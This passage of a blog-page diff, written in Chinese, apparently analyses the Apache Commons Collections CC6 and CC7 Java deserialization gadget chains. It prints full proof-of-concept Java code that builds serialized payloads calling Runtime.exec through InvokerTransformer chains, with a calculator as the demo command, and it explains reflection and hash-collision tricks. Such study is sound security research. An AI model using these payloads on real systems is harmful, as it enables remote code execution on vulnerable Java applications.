+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;,
+                        new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,
+                        new Object[]&#123;&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;),
+                new ConstantTransformer(1), // 隐藏错误信息
+        &#125;;
+        //将 fakeTransformers 数组存入 ChainedTransformer 这个继承类
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+
+        Map innerMap = new HashMap();
+        //使用 LazyMap
+        Map outerMap = LazyMap.decorate(innerMap,transformerChain);
+
+        // 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;yhy&quot;);
+//        tiedMapEntry.hashCode();
+
+//        // HashMap 自动触发
+        HashMap hashMap = new HashMap();
+
+        hashMap.put(tiedMapEntry, &quot;yhy&quot;);
+
+        // put 后再把key去除，防止影响后续执行
+        outerMap.remove(&quot;yhy&quot;);
+
+        // 反射加入加入payload ,这样在put时就不会执行
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+        
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
+        oos.writeObject(hashMap);
+        
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
+        ois.readObject();
+
+    &#125;
+&#125;
+</code></pre>
+<p>这里使用的是P牛的POC，加入了人畜无害的Transformer数组，为了避免本地调试时触发命令执行，构造 LazyMap 的时候先用了一个人畜无害的 fakeTransformers 对象，等最后要生成 Payload 的时候，再把真正的 transformers 替换进去。</p>
+<h2 id="0x03-HashSet利用链分析："><a href="#0x03-HashSet利用链分析：" class="headerlink" title="0x03 HashSet利用链分析："></a>0x03 HashSet利用链分析：</h2><p>前面说的是P牛写的简化版，真正的CC6是使用HashSet的readObject作为入口。</p>
+<p>HashSet#readObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215160514419.png" alt="image-20211215160514419"></p>
+<p>在进行反序列化的过程中，实例化HashMap对象，并调用了map.put(e, PRESENT)方法。如果传入的e参数可控，并且可以赋值恶意的TiedMapEntry对象，即可执行恶意代码。e参数是通过调用readObject方法获取的，所以需要找到对应的将e参数进行序列化的writeObject方法。在HashSet#writeObject方法中找到了对应方法。</p>
+<p>HashSet#writeObject</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211215160634753.png" alt="image-20211215160634753"></p>
+<p>遍历map对象中的key值，并循环调用writeObject方法进行序列化。因此，需要将恶意的TiedMapEntry对象注入到HashMap的Key值中。HashMap的key属性存储在HashMap$Node类型的HashMap#table属性中，构造反射链获取key属性。</p>
+<p>通过反射出HashMap的key，并将恶意TiedMapEntry对象赋值给key属性中。至此，利用链构造完成。</p>
+<p>POC：</p>
+<pre><code>public class cc6 &#123;
+
+        public static void main(String[] args) throws Exception &#123;
+
+                //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+                Transformer[] transformers = new Transformer[]&#123;
+                        new ConstantTransformer(Runtime.class),
+                        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;,
+                                new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;,
+                                new Object[]&#123;null, null&#125;),
+                        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,
+                                new Object[]&#123;&quot;&quot;&#125;),
+                        new ConstantTransformer(1), // 隐藏错误信息
+                &#125;;
+                //将 fakeTransformers 数组存入 ChainedTransformer 这个继承类
+                Transformer transformerChain = new ChainedTransformer(transformers);
+
+                Map innerMap = new HashMap();
+                //使用 LazyMap
+                Map outerMap = LazyMap.decorate(innerMap,transformerChain);
+
+                // 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下
+                TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,&quot;yhy&quot;);
+
+                // 指定初始容量为1，可以装两个
+                HashSet hashSet = new HashSet(1);
+                hashSet.add(&quot;yhy&quot;);   //hashmap的key=yhy   [yhy,null]
+
+                // 反射获取HashSet中map的值
+                Field map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);
+                // 取消访问限制检查
+                map.setAccessible(true);
+                // 设置HashSet中map为HashMap
+                HashMap hashSetMap = (HashMap) map.get(hashSet); //yhy
+                System.out.println(hashSetMap);  //[key:yhy,value:null]
+
+                // 反射获取 HashMap 中 table 的值
+                Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);
+                // 取消访问限制检查
+                table.setAccessible(true);
+                // 获取 hashSet 中 map 的值
+                Object[] hashMapTable = (Object[]) table.get(hashSetMap);
+                //获取Table的node链表
+                Object node = hashMapTable[0];
+                if(node == null) &#123;
+                        //[key:yhy,value:null]
+                        node = hashMapTable[1];
+                &#125;
+
+                // 将 key 设为 tiedMapEntry
+                Field key =  node.getClass().getDeclaredField(&quot;key&quot;);
+                key.setAccessible(true);
+                key.set(node, tiedMapEntry);
+                System.out.println(key);
+                
+                // 序列化
+                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;outY.bin&quot;));
+                oos.writeObject(hashSet);
+
+                // 反序列化读取 out.bin 文件
+                ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;outY.bin&quot;));
+                ois.readObject();
+        &#125;
+&#125;
+</code></pre>
+<h2 id="0x04-疑问解答记录"><a href="#0x04-疑问解答记录" class="headerlink" title="0x04 疑问解答记录"></a>0x04 疑问解答记录</h2><p>1.hashMapTable[0]为什么是null</p>
+<p>1.hashMapTable[0]为什么等于null。</p>
+<pre><code>Object node = hashMapTable[0]
+</code></pre>
+<p> hashmap 类 的table字段，它是Node&lt;K,V&gt;[] node，而node是链表，链表的第一个结点称为头结点，只存储一个指针地址，指向第一个结点元素。</p>
+<p>我们可以添加一个循环输出数组中的元素，可以看到第一个元素是null。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216215056569.png" alt="image-20211216215056569"></p>
+<p>2.HashMap hashSetMap = (HashMap) map.get(hashSet)的意思</p>
+<p>返回指定对象hashSet上 map 表示的字段的值,并赋值给hashSetMap，并赋值给hashSetMap。</p>
+<p>注意:hashSet方法中的map只能是HashMap</p>
+<pre><code>private transient HashMap&lt;E,Object&gt; map;
+</code></pre>
+<h1 id="CommonsCollections7分析"><a href="#CommonsCollections7分析" class="headerlink" title="CommonsCollections7分析"></a>CommonsCollections7分析</h1><p>版本要求：</p>
+<ul>
+<li>JDK无要求</li>
+<li>CommonsCollections 3.1 - 3.2.1</li>
+</ul>
+<h2 id="0x01利用链：-1"><a href="#0x01利用链：-1" class="headerlink" title="0x01利用链："></a>0x01利用链：</h2><pre><code>
+       java.util.Hashtable.readObject
+    java.util.Hashtable.reconstitutionPut
+    org.apache.commons.collections.map.AbstractMapDecorator.equals
+    java.util.AbstractMap.equals
+    org.apache.commons.collections.map.LazyMap.get
+    org.apache.commons.collections.functors.ChainedTransformer.transform
+    org.apache.commons.collections.functors.InvokerTransformer.transform
+    java.lang.reflect.Method.invoke
+    sun.reflect.DelegatingMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke
+    sun.reflect.NativeMethodAccessorImpl.invoke0
+    java.lang.Runtime.exec
+</code></pre>
+<h2 id="0x02-POC：-3"><a href="#0x02-POC：-3" class="headerlink" title="0x02 POC："></a>0x02 POC：</h2><pre><code>public class cc7 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,
+                        new Class[]&#123;String.class, Class[].class&#125;,
+                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[]&#123;Object.class, Object[].class&#125;,
+                        new Object[]&#123;null, new Object[0]&#125;),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        System.out.println(lazyMap1);
+        lazyMap1.put(&quot;yy&quot;, 1);
+        System.out.println(lazyMap1);
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+        Field field =transformerChain.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(transformerChain,transformers);
+
+        lazyMap2.remove(&quot;yy&quot;);
+
+        try&#123;
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc7&quot;));
+            outputStream.writeObject(hashtable);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc7&quot;));
+            inputStream.readObject();
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+
+    &#125;
+&#125;
+</code></pre>
+<h2 id="0x03-疑问解答记录"><a href="#0x03-疑问解答记录" class="headerlink" title="0x03 疑问解答记录"></a>0x03 疑问解答记录</h2><p>1.为什么 e.key.equals , 这里的key是LazyMap,但为什么能够调用AbstractMap中的equals方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216093621655.png" alt="image-20211216093621655"></p>
+<p>这里就看个人基础学的怎么样了。</p>
+<p>因为，LazyMap继承于<code>AbstractMapDecorator</code>抽象类，抽象类中的非抽象方法不用重写，所以调用的是父类的equals方法。</p>
+<p>AbstractMapDecorator#equals</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216103027545.png" alt="image-20211216103027545"></p>
+<p>可以看到，这里的map就是Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain)传进来的HashMap，</p>
+<p>HashMap继承于抽象类AbstractMap，所以这里调用的是HashMap.equals方法。这里看着会比较绕。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216103538152.png" alt="image-20211216103538152"></p>
+<p>后面就是调用LazyMap.get触发后续链的RCE了，这里就不重复分析了。</p>
+<p>2.为什么需要实例化两次LazyMap对象</p>
+<p>Hashtable#reconstitutionPut</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216144853813.png" alt="image-20211216144853813"></p>
+<p>可以看到e是table[index],hash是key的hashCode。而table[index]第一次是空的，它会到后面才进行赋值。所以if语句中（e.hash == hash）是flase，&amp;&amp;具有短路的功能，即如果第一个表达式为false，则不再计算第二个表达式。</p>
+<p>但第二次调用reconstitutionPut方法的时候，table[index]已经被赋值。而在java中有一个小bug：</p>
+<pre><code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()
+</code></pre>
+<p>所以（e.hash == hash）是true，从而正常调用<code>e.key.equals(key)</code>方法，真的秒啊喵啊。</p>
+<p>3.为什么最后面要lazyMap2.remove(“yy”)呢</p>
+<p>首先来说一下为什么最后要 remove ，因为在 AbstractMap#equals 这里的 size() 等于 1，而我们不remove的话 m.size() 就为2 这样的话就不等于来，直接返回 false，导致无法进入到后面。</p>
+<p>我们可以在POC下断点，可以看到我们利用put添加数据的时候，在序列化的时候会调用AbstractMap#equals，从而调用了LazyMap#get方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216163249400.png" alt="image-20211216163249400"></p>
+<p>发现我们在生成 payload 的过程中，调用  <code>this.factory.transform</code> 的时候 ，由于我们是反射进行赋值的，所以这里只有一个空的 Transformer数组，同时传入的 key 为 yy，所以这里只会返回 yy，也就是这里的 value 是 yy 。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216163057325.png" alt="image-20211216163057325"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216163852464.png" alt="image-20211216163852464"></p>
+<p>相当于在我们生成 payload 会多出来一个 yy，然后我们需要 remove 掉这个 yy，不然的话就会进入上面说的 AbstractMap#equals  中的 if 判断那段，从而导致无法进入到我们的出发点。</p>
+<p>AbstractMap#equals </p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216163804045.png" alt="image-20211216163804045"></p>
+<p>4.为什么 Poc 中要反射来对我们的 ChainedTransformer 进行赋值</p>
+<pre><code> Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);
+......
+
+Field field =transformerChain.getClass().getDeclaredField(&quot;iTransformers&quot;);
+field.setAccessible(true);
+field.set(transformerChain,transformers);
+</code></pre>
+<p>一开始我们创建的ChainedTransformer其实只给了一个空的Transformer[]，最后再通过反射反射来对我们的 ChainedTransformer 进行赋值。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211216153717053.png" alt="image-20211216153717053"></p>
+<p>如果我们用上面的代码尝试生成的话，可以发现在 Hashtable#put 中也会调用到 AbstractMap#equals 从而触发 LazyMap#get 导致我们在生成 payload 的时候就本地执行了一次 RCE ，不过在这里并不会影响后面反序列化的触发，相当于这样的话一共会触发两次 一次在客户端一次在服务端，但是为了减少干扰我们还是利用反射最后进行赋值这样我们本地在生成 payload 的时候就不会触发 RCE 了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h2><ul>
+<li>1、3、5、6、7是Commons Collections&lt;=3.2.1中存在的反序列化链。</li>
+<li>2、4是Commons Collections 4.0以上中存在的反序列化链。</li>
+<li>同时还对JDK的版本有要求，我使用的测试版本为1.7和1.8。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211217112200881.png" alt="image-20211217112200881"></p>
+<p>如果这篇文章有什么错误的地方，欢迎指出来，我会对其进行修改。</p>
 <h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#_8">https://paper.seebug.org/1242/#_8</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1723/">https://paper.seebug.org/1723/</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219840#h2-0">https://www.anquanke.com/post/id/219840#h2-0</a></p>
 <p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535">http://wjlshare.com/archives/1535</a></p>
+<p><a target="_blank" rel="noopener" href="https://fireline.fun/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/">https://fireline.fun/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30507287/article/details/80488512">https://blog.csdn.net/qq_30507287/article/details/80488512</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42477505/article/details/112708659">https://blog.csdn.net/weixin_42477505/article/details/112708659</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -1087,12 +1396,12 @@ public class cc5 &#123;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections3-5分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">2.2k</span></p>
+    <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections3-7分析</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">5k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-12, 20:36:43</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections3-5分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/</a>
+    <p><span class="copy-title">Updated At:</span>2021-12-19, 09:46:19</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections3-7分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
